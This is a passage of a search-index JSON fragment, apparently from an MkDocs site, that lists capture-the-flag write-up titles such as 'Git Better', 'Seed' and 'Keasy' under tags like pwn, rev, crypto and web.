<li>Weird Code</li> </ul>"},{"location":"tags.html#2023","title":"2023","text":"<ul> <li>Git Better</li> <li>format_string ftw</li> <li>Seed</li> <li>Three Sum</li> <li>Chocolate Cake</li> <li>Nest</li> <li>Keasy</li> <li>Matrix</li> </ul>"},{"location":"tags.html#bcactf","title":"bcactf","text":"<ul> <li>Git Better</li> </ul>"},{"location":"tags.html#coderush","title":"coderush","text":"<ul> <li>format_string ftw</li> <li>Seed</li> <li>Three Sum</li> </ul>"},{"location":"tags.html#crypto","title":"crypto","text":"<ul> <li>Git Better</li> </ul>"},{"location":"tags.html#flaghunt","title":"flaghunt","text":"<ul> <li>Weird Code</li> <li>Chocolate Cake</li> <li>Nest</li> <li>Keasy</li> <li>Matrix</li> </ul>"},{"location":"tags.html#mkdocs","title":"mkdocs","text":"<ul> <li>Hello World</li> </ul>"},{"location":"tags.html#pwn","title":"pwn","text":"<ul> <li>format_string ftw</li> <li>Seed</li> <li>Three Sum</li> </ul>"},{"location":"tags.html#python","title":"python","text":"<ul> <li>Weird Code</li> </ul>"},{"location":"tags.html#rand","title":"rand","text":"<ul> <li>Seed</li> </ul>"},{"location":"tags.html#rev","title":"rev","text":"<ul> <li>Weird Code</li> <li>Git Better</li> <li>Chocolate Cake</li> <li>Nest</li> <li>Keasy</li> <li>Matrix</li> </ul>"},{"location":"tags.html#web","title":"web","text":"<ul> <li>Git Better</li> </ul>"},{"location":"tags.html#xor","title":"xor","text":"<ul> <li>Weird Code</li> </ul>"}]}